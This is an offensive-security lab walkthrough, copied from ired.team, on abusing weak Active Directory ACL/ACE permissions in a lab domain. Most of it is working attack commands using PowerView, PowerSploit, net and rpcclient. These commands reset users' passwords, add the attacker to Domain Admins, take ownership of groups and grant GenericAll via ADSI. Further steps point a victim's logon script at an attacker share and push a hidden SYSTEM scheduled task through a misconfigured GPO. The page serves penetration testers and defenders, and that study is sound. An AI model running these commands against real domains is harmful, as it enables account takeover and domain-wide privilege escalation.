# Abusing Active Directory ACLs/ACEs

**This information was copied from** [**https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-acls-aces**](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-acls-aces) **because it's just perfect**

## Context

This lab is to abuse weak permissions of Active Directory Discretionary Access Control Lists \(DACLs\) and Acccess Control Entries \(ACEs\) that make up DACLs.

Active Directory objects such as users and groups are securable objects and DACL/ACEs define who can read/modify those objects \(i.e change account name, reset password, etc\). 

An example of ACEs for the "Domain Admins" securable object can be seen here:

![](../../.gitbook/assets/1%20%281%29.png)

Some of the Active Directory object permissions and types that we as attackers are interested in:

* **GenericAll** - full rights to the object \(add users to a group or reset user's password\)
* **GenericWrite** - update object's attributes \(i.e logon script\)
* **WriteOwner** - change object owner to attacker controlled user take over the object
* **WriteDACL** - modify object's ACEs and give attacker full control right over the object
* **AllExtendedRights** - ability to add user to a group or reset password
* **ForceChangePassword** - ability to change user's password
* **Self \(Self-Membership\)** - ability to add yourself to a group

In this lab, we are going to explore and try to exploit most of the above ACEs.

## GenericAll on User

Using powerview, let's check if our attacking user `spotless` has `GenericAll rights` on the AD object for the user `delegate`:

```csharp
Get-ObjectAcl -SamAccountName delegate -ResolveGUIDs | ? {$_.ActiveDirectoryRights -eq "GenericAll"}  
```

We can see that indeed our user `spotless` has the `GenericAll` rights, effectively enabling the attacker to take over the account:

![](../../.gitbook/assets/2.png)

We can reset user's `delegate` password without knowing the current password:

![](../../.gitbook/assets/3.png)

## GenericAll on Group

Let's see if `Domain admins` group has any weak permissions. First of, let's get its `distinguishedName`:

```csharp
Get-NetGroup "domain admins" -FullData
```

![](../../.gitbook/assets/4.png)

```csharp
 Get-ObjectAcl -ResolveGUIDs | ? {$_.objectdn -eq "CN=Domain Admins,CN=Users,DC=offense,DC=local"}
```

We can see that our attacking user `spotless` has `GenericAll` rights once again:

![](../../.gitbook/assets/5.png)

Effectively, this allows us to add ourselves \(the user `spotless`\) to the `Domain Admin` group:

```csharp
net group "domain admins" spotless /add /domain
```

![](../../.gitbook/assets/6.gif)

Same could be achieved with Active Directory or PowerSploit module:

```csharp
# with active directory module
Add-ADGroupMember -Identity "domain admins" -Members spotless

# with Powersploit
Add-NetGroupUser -UserName spotless -GroupName "domain admins" -Domain "offense.local"
```

## GenericAll / GenericWrite / Write on Computer

If you have these privileges on a Computer object, you can pull [Kerberos **Resource-based Constrained Delegation**: Computer Object Take Over](resource-based-constrained-delegation.md) off.

## WriteProperty on Group

If our controlled user has `WriteProperty` right on `All` objects for `Domain Admin` group:

![](../../.gitbook/assets/7.png)

We can again add ourselves to the `Domain Admins` group and escalate privileges:

```csharp
net user spotless /domain; Add-NetGroupUser -UserName spotless -GroupName "domain admins" -Domain "offense.local"; net user spotless /domain
```

![](../../.gitbook/assets/8.png)

## Self \(Self-Membership\) on Group

Another privilege that enables the attacker adding themselves to a group:

![](../../.gitbook/assets/9.png)

```csharp
net user spotless /domain; Add-NetGroupUser -UserName spotless -GroupName "domain admins" -Domain "offense.local"; net user spotless /domain
```

![](../../.gitbook/assets/10.png)

## WriteProperty \(Self-Membership\)

One more privilege that enables the attacker adding themselves to a group:

```csharp
Get-ObjectAcl -ResolveGUIDs | ? {$_.objectdn -eq "CN=Domain Admins,CN=Users,DC=offense,DC=local" -and $_.IdentityReference -eq "OFFENSE\spotless"}
```

![](../../.gitbook/assets/11.png)

```csharp
net group "domain admins" spotless /add /domain
```

![](../../.gitbook/assets/12.png)

## **ForceChangePassword**

If we have `ExtendedRight` on `User-Force-Change-Password` object type, we can reset the user's password without knowing their current password:

```csharp
Get-ObjectAcl -SamAccountName delegate -ResolveGUIDs | ? {$_.IdentityReference -eq "OFFENSE\spotless"}
```

![](../../.gitbook/assets/13.png)

Doing the same with powerview:

```csharp
Set-DomainUserPassword -Identity delegate -Verbose
```

![](../../.gitbook/assets/14.png)

Another method that does not require fiddling with password-secure-string conversion:

```csharp
$c = Get-Credential
Set-DomainUserPassword -Identity delegate -AccountPassword $c.Password -Verbose
```

![](../../.gitbook/assets/15.png)

...or a one liner if no interactive session is not available:

```csharp
Set-DomainUserPassword -Identity delegate -AccountPassword (ConvertTo-SecureString '123456' -AsPlainText -Force) -Verbose
```

![](../../.gitbook/assets/16.png)

and one last way yo achieve this from linux:

```markup
rpcclient -U KnownUsername 10.10.10.192
> setuserinfo2 UsernameChange 23 'ComplexP4ssw0rd!'
```

More info:

* [https://malicious.link/post/2017/reset-ad-user-password-with-linux/](https://malicious.link/post/2017/reset-ad-user-password-with-linux/)
* [https://docs.microsoft.com/en-us/openspecs/windows\_protocols/ms-samr/6b0dff90-5ac0-429a-93aa-150334adabf6?redirectedfrom=MSDN](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-samr/6b0dff90-5ac0-429a-93aa-150334adabf6?redirectedfrom=MSDN)
* [https://docs.microsoft.com/en-us/openspecs/windows\_protocols/ms-samr/e28bf420-8989-44fb-8b08-f5a7c2f2e33c](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-samr/e28bf420-8989-44fb-8b08-f5a7c2f2e33c)

## WriteOwner on Group

Note how before the attack the owner of `Domain Admins` is `Domain Admins`:

![](../../.gitbook/assets/17.png)

After the ACE enumeration, if we find that a user in our control has `WriteOwner` rights on `ObjectType:All`

```csharp
Get-ObjectAcl -ResolveGUIDs | ? {$_.objectdn -eq "CN=Domain Admins,CN=Users,DC=offense,DC=local" -and $_.IdentityReference -eq "OFFENSE\spotless"}
```

![](../../.gitbook/assets/18.png)

...we can change the `Domain Admins` object's owner to our user, which in our case is `spotless`. Note that the SID specified with `-Identity` is the SID of the `Domain Admins` group:

```csharp
Set-DomainObjectOwner -Identity S-1-5-21-2552734371-813931464-1050690807-512 -OwnerIdentity "spotless" -Verbose
//You can also use the name instad of the SID (HTB: Reel)
Set-DomainObjectOwner -Identity Herman -OwnerIdentity nico
```

![](../../.gitbook/assets/19.png)

## GenericWrite on User

```csharp
Get-ObjectAcl -ResolveGUIDs -SamAccountName delegate | ? {$_.IdentityReference -eq "OFFENSE\spotless"}
```

![](../../.gitbook/assets/20.png)

`WriteProperty` on an `ObjectType`, which in this particular case is `Script-Path`, allows the attacker to overwrite the logon script path of the `delegate` user, which means that the next time, when the user `delegate` logs on, their system will execute our malicious script:

```csharp
Set-ADObject -SamAccountName delegate -PropertyName scriptpath -PropertyValue "\\10.0.0.5\totallyLegitScript.ps1"
```

Below shows the user's ~~`delegate`~~ logon script field got updated in the AD:

![](../../.gitbook/assets/21.png)

## WriteDACL + WriteOwner

If you are the owner of a group, like I'm the owner of a `Test` AD group:

![](../../.gitbook/assets/22.png)

Which you can of course do through powershell:

```csharp
([ADSI]"LDAP://CN=test,CN=Users,DC=offense,DC=local").PSBase.get_ObjectSecurity().GetOwner([System.Security.Principal.NTAccount]).Value
```

![](../../.gitbook/assets/23.png)

And you have a `WriteDACL` on that AD object:

![](../../.gitbook/assets/24.png)

...you can give yourself [`GenericAll`]() privileges with a sprinkle of ADSI sorcery:

```csharp
$ADSI = [ADSI]"LDAP://CN=test,CN=Users,DC=offense,DC=local"
$IdentityReference = (New-Object System.Security.Principal.NTAccount("spotless")).Translate([System.Security.Principal.SecurityIdentifier])
$ACE = New-Object System.DirectoryServices.ActiveDirectoryAccessRule $IdentityReference,"GenericAll","Allow"
$ADSI.psbase.ObjectSecurity.SetAccessRule($ACE)
$ADSI.psbase.commitchanges()
```

Which means you now fully control the AD object:

![](../../.gitbook/assets/25.png)

This effectively means that you can now add new users to the group.

Interesting to note that I could not abuse these privileges by using Active Directory module and `Set-Acl` / `Get-Acl` cmdlets:

```csharp
$path = "AD:\CN=test,CN=Users,DC=offense,DC=local"
$acl = Get-Acl -Path $path
$ace = new-object System.DirectoryServices.ActiveDirectoryAccessRule (New-Object System.Security.Principal.NTAccount "spotless"),"GenericAll","Allow"
$acl.AddAccessRule($ace)
Set-Acl -Path $path -AclObject $acl
```

![](../../.gitbook/assets/26.png)

## **Replication on the domain \(DCSync\)**

The **DCSync** permission implies having these permissions over the domain itself: **DS-Replication-Get-Changes**, **Replicating Directory Changes All** and **Replicating Directory Changes In Filtered Set**.  
[**Learn more about the DCSync attack here.**](dcsync.md)\*\*\*\*

## GPO Delegation <a id="gpo-delegation"></a>

Sometimes, certain users/groups may be delegated access to manage Group Policy Objects as is the case with `offense\spotless` user:

![](../../.gitbook/assets/a13.png)

We can see this by leveraging PowerView like so:

```bash
Get-ObjectAcl -ResolveGUIDs | ? {$_.IdentityReference -eq "OFFENSE\spotless"}
```

The below indicates that the user `offense\spotless` has **WriteProperty**, **WriteDacl**, **WriteOwner** privileges among a couple of others that are ripe for abuse:

![](../../.gitbook/assets/a14.png)

\*\*\*\*[**More about general AD ACL/ACE abuse here.**](acl-persistence-abuse.md)\*\*\*\*

### Abusing the GPO Permissions <a id="abusing-the-gpo-permissions"></a>

We know the above ObjectDN from the above screenshot is referring to the `New Group Policy Object` GPO since the ObjectDN points to `CN=Policies` and also the `CN={DDC640FF-634A-4442-BC2E-C05EED132F0C}` which is the same in the GPO settings as highlighted below:

![](../../.gitbook/assets/a15.png)

If we want to search for misconfigured GPOs specifically, we can chain multiple cmdlets from PowerSploit like so:

```bash
Get-NetGPO | %{Get-ObjectAcl -ResolveGUIDs -Name $_.Name} | ? {$_.IdentityReference -eq "OFFENSE\spotless"}
```

![](../../.gitbook/assets/a16.png)

#### Computers with a Given Policy Applied <a id="computers-with-a-given-policy-applied"></a>

We can now resolve the computer names the GPO `Misconfigured Policy` is applied to:

```text
Get-NetOU -GUID "{DDC640FF-634A-4442-BC2E-C05EED132F0C}" | % {Get-NetComputer -ADSpath $_}
```

![](../../.gitbook/assets/a17.png)

#### Policies Applied to a Given Computer <a id="policies-applied-to-a-given-computer"></a>

```text
Get-DomainGPO -ComputerIdentity ws01 -Properties Name, DisplayName
```

![](https://blobs.gitbook.com/assets%2F-LFEMnER3fywgFHoroYn%2F-LWNAqc8wDhu0OYElzrN%2F-LWNBOmSsNrObOboiT2E%2FScreenshot%20from%202019-01-16%2019-44-19.png?alt=media&token=34332022-c1fc-4f97-a7e9-e0e4d98fa8a5)

#### OUs with a Given Policy Applied <a id="ous-with-a-given-policy-applied"></a>

```text
Get-DomainOU -GPLink "{DDC640FF-634A-4442-BC2E-C05EED132F0C}" -Properties DistinguishedName
```

![](https://blobs.gitbook.com/assets%2F-LFEMnER3fywgFHoroYn%2F-LWNAqc8wDhu0OYElzrN%2F-LWNBtLT332kTVDzd5qV%2FScreenshot%20from%202019-01-16%2019-46-33.png?alt=media&token=ec90fdc0-e0dc-4db0-8279-cde4720df598)

#### Abusing Weak GPO Permissions <a id="abusing-weak-gpo-permissions"></a>

One of the ways to abuse this misconfiguration and get code execution is to create an immediate scheduled task through the GPO like so:

```text
New-GPOImmediateTask -TaskName evilTask -Command cmd -CommandArguments "/c net localgroup administrators spotless /add" -GPODisplayName "Misconfigured Policy" -Verbose -Force
```

![](../../.gitbook/assets/a19.png)

The above will add our user spotless to the local `administrators` group of the compromised box. Note how prior to the code execution the group does not contain user `spotless`:

![](../../.gitbook/assets/a20.png)

### Force Policy Update <a id="force-policy-update"></a>

ScheduledTask and its code will execute after the policy updates are pushed through \(roughly each 90 minutes\), but we can force it with `gpupdate /force` and see that our user `spotless` now belongs to local administrators group:

![](../../.gitbook/assets/a21.png)

### Under the hood <a id="under-the-hood"></a>

If we observe the Scheduled Tasks of the `Misconfigured Policy` GPO, we can see our `evilTask` sitting there:

![](../../.gitbook/assets/a22.png)

Below is the XML file that got created by `New-GPOImmediateTask` that represents our evil scheduled task in the GPO:

{% code title="\\\\offense.local\\SysVol\\offense.local\\Policies\\{DDC640FF-634A-4442-BC2E-C05EED132F0C}\\Machine\\Preferences\\ScheduledTasks\\ScheduledTasks.xml" %}
```markup
<?xml version="1.0" encoding="utf-8"?>
<ScheduledTasks clsid="{CC63F200-7309-4ba0-B154-A71CD118DBCC}">
    <ImmediateTaskV2 clsid="{9756B581-76EC-4169-9AFC-0CA8D43ADB5F}" name="evilTask" image="0" changed="2018-11-20 13:43:43" uid="{6cc57eac-b758-4c52-825d-e21480bbb47f}" userContext="0" removePolicy="0">
        <Properties action="C" name="evilTask" runAs="NT AUTHORITY\System" logonType="S4U">
            <Task version="1.3">
                <RegistrationInfo>
                    <Author>NT AUTHORITY\System</Author>
                    <Description></Description>
                </RegistrationInfo>
                <Principals>
                    <Principal id="Author">
                        <UserId>NT AUTHORITY\System</UserId>
                        <RunLevel>HighestAvailable</RunLevel>
                        <LogonType>S4U</LogonType>
                    </Principal>
                </Principals>
                <Settings>
                    <IdleSettings>
                        <Duration>PT10M</Duration>
                        <WaitTimeout>PT1H</WaitTimeout>
                        <StopOnIdleEnd>true</StopOnIdleEnd>
                        <RestartOnIdle>false</RestartOnIdle>
                    </IdleSettings>
                    <MultipleInstancesPolicy>IgnoreNew</MultipleInstancesPolicy>
                    <DisallowStartIfOnBatteries>false</DisallowStartIfOnBatteries>
                    <StopIfGoingOnBatteries>true</StopIfGoingOnBatteries>
                    <AllowHardTerminate>false</AllowHardTerminate>
                    <StartWhenAvailable>true</StartWhenAvailable>
                    <AllowStartOnDemand>false</AllowStartOnDemand>
                    <Enabled>true</Enabled>
                    <Hidden>true</Hidden>
                    <ExecutionTimeLimit>PT0S</ExecutionTimeLimit>
                    <Priority>7</Priority>
                    <DeleteExpiredTaskAfter>PT0S</DeleteExpiredTaskAfter>
                    <RestartOnFailure>
                        <Interval>PT15M</Interval>
                        <Count>3</Count>
                    </RestartOnFailure>
                </Settings>
                <Actions Context="Author">
                    <Exec>
                        <Command>cmd</Command>
                        <Arguments>/c net localgroup administrators spotless /add</Arguments>
                    </Exec>
                </Actions>
                <Triggers>
                    <TimeTrigger>
                        <StartBoundary>%LocalTimeXmlEx%</StartBoundary>
                        <EndBoundary>%LocalTimeXmlEx%</EndBoundary>
                        <Enabled>true</Enabled>
                    </TimeTrigger>
                </Triggers>
            </Task>
        </Properties>
    </ImmediateTaskV2>
</ScheduledTasks>
```
{% endcode %}

### Users and Groups <a id="users-and-groups"></a>

The same privilege escalation could be achieved by abusing the GPO Users and Groups feature. Note in the below file, line 6 where the user `spotless` is added to the local `administrators` group - we could change the user to something else, add another one or even add the user to another group/multiple groups since we can amend the policy configuration file in the shown location due to the GPO delegation assigned to our user `spotless`:

{% code title="\\\\offense.local\\SysVol\\offense.local\\Policies\\{DDC640FF-634A-4442-BC2E-C05EED132F0C}\\Machine\\Preferences\\Groups" %}
```markup
<?xml version="1.0" encoding="utf-8"?>
<Groups clsid="{3125E937-EB16-4b4c-9934-544FC6D24D26}">
    <Group clsid="{6D4A79E4-529C-4481-ABD0-F5BD7EA93BA7}" name="Administrators (built-in)" image="2" changed="2018-12-20 14:08:39" uid="{300BCC33-237E-4FBA-8E4D-D8C3BE2BB836}">
        <Properties action="U" newName="" description="" deleteAllUsers="0" deleteAllGroups="0" removeAccounts="0" groupSid="S-1-5-32-544" groupName="Administrators (built-in)">
            <Members>
                <Member name="spotless" action="ADD" sid="" />
            </Members>
        </Properties>
    </Group>
</Groups>
```
{% endcode %}

Additionally, we could think about leveraging logon/logoff scripts, using registry for autoruns, installing .msi, edit services and similar code execution avenues.

## References

{% embed url="https://wald0.com/?p=112" %}

{% embed url="https://docs.microsoft.com/en-us/dotnet/api/system.directoryservices.activedirectoryrights?view=netframework-4.7.2" %}

{% embed url="https://blog.fox-it.com/2018/04/26/escalating-privileges-with-acls-in-active-directory/" %}

{% embed url="https://adsecurity.org/?p=3658" %}

{% embed url="https://docs.microsoft.com/en-us/dotnet/api/system.directoryservices.activedirectoryaccessrule.-ctor?view=netframework-4.7.2\#System\_DirectoryServices\_ActiveDirectoryAccessRule\_\_ctor\_System\_Security\_Principal\_IdentityReference\_System\_DirectoryServices\_ActiveDirectoryRights\_System\_Security\_AccessControl\_AccessControlType\_" %}

